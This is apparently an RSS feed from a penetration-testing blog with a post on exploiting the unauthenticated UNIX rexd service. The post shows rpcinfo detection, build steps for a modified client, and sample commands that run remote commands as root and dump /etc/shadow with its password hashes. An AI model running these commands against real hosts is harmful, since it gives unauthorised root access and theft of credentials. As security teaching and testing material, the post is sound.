<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>rexd &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/rexd/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Thu, 10 Nov 2011 21:37:09 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Rexd Client For Linux</title>
		<link>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2</link>
					<comments>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 01 Nov 2008 12:56:53 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[rexd]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=116</guid>

					<description><![CDATA[Full details about &#8220;on&#8221;, the rexd client can be found on this blog post.]]></description>
										<content:encoded><![CDATA[<p>Full details about &#8220;on&#8221;, the rexd client can be found on this <a href="http://pentestmonkey.net/blog/rexd-client-for-linux/">blog post</a>.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Rexd Client For Linux</title>
		<link>https://pentestmonkey.net/blog/rexd-client-for-linux</link>
					<comments>https://pentestmonkey.net/blog/rexd-client-for-linux#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Thu, 23 Oct 2008 22:24:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[rexd]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=70</guid>

					<description><![CDATA[I recently encountered the rexd service running on a host I was testing.  This is a really old-school UNIX service which you don&#8217;t see much on modern networks (in my experience at least).  It&#8217;s well know that it&#8217;s insecure: It basically lets you run any command on the host as any user you like with [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I recently encountered the <a href="http://docs.sun.com/app/docs/doc/816-5212/6mbcdgk7r?a=view">rexd</a> service running on a host I was testing.  This is a really old-school UNIX service which you don&#8217;t see much on modern networks (in my experience at least).  It&#8217;s <a href="http://www.porcupine.org/satan/demo/tutorials/vulnerability/REXD_access.html">well know</a> that it&#8217;s insecure: It basically lets you run any command on the host as any user you like with no authentication.</p>
<p>This post briefly covers how to identify the service and how to exploit it.  I&#8217;ve also modified the rexd client from SATAN to compile cleanly on Linux (download link below&#8230;).</p>
<p>&nbsp;</p>
<p><span id="more-70"></span></p>
<h3>Identifying Hosts Running Rexd</h3>
<p>Use rpcinfo to check the RPC service running on the target host (assuming the portmapper is running &#8211; 111/TCP).  If rexd is listed, you&#8217;re in luck:</p>
<pre>$ rpcinfo -p 10.0.0.1
   program vers proto   port                               
    100000    4   tcp    111  rpcbind                      
    100000    3   tcp    111  rpcbind                      
    100000    2   tcp    111  rpcbind                      
    100000    4   udp    111  rpcbind                      
    100000    3   udp    111  rpcbind                      
    100000    2   udp    111  rpcbind                      
    100229    1   tcp  32795  metad                        
    100229    2   tcp  32795  metad                        
    100230    1   tcp  32796  metamhd                      
    100242    1   tcp  32797  rpc.metamedd                 
    100017    1   tcp  32798  rexd                   &lt;---   :-)
...</pre>
<h3>Exploitation</h3>
<p>Exploitation is a simple as finding a client and running it.  Solaris hosts usually have the client &#8220;on&#8221; installed by default.  If you&#8217;ve got a Solaris VM, or you&#8217;ve already broken into another Solaris machine during your pentest, you can probably use that.</p>
<p>Alternatively, if you&#8217;d prefer a Linux client, it seems you&#8217;re out of luck.  Modern distros don&#8217;t seem to have such a client (I checked Gentoo and Debian).  SATAN (an old-school pentesting toolkit) has one which I modified to compile cleanly and be a bit easier to use.  <a href="http://www.pentestmonkey.net/tools/on/on.tar.gz">Download my modified rexd client here</a>.</p>
<p><em>Update: 2011-11 Thanks to Hank Leininger for the patch. Now supports -p arg.</em></p>
<p>To compile / install:</p>
<pre>$ tar xfz on.tar.gz
$ cd on
$ make
$ sudo make install</pre>
<p>Help message:</p>
<pre>$ on
Usage: on [ -u uid ] [ -g gid ] [ -h hostname ] ip command...
Examples:
    on 10.0.0.1 cat /etc/shadow
    on 10.0.0.1 -u 1 10.0.0.1 id

on is a client for rexd, the Remote Execution Daemon.  To check if a target
is running rexd, do 'rpcinfo -p ip' and check for rexd (program number 100017).

If rexd is running on the target you should be able to execute commands on the
remote host as any user you like.

This program is a minor modification of 'rex' by Wietse Venema, part of SATAN:
http://www.porcupine.org/satan/mirrors.html</pre>
<p>To run:</p>
<pre>$ on 10.0.0.1 id
uid=0(root) gid=0(root)
$ on -u 1 -g 2 10.0.0.1 id
uid=1(daemon) gid=2(bin)
$ on 10.0.0.1 cat /etc/shadow
root:.VLpoFoQoa8eY:14175::::::
daemon:NP:6445::::::
bin:NP:6445::::::
...</pre>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/rexd-client-for-linux/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
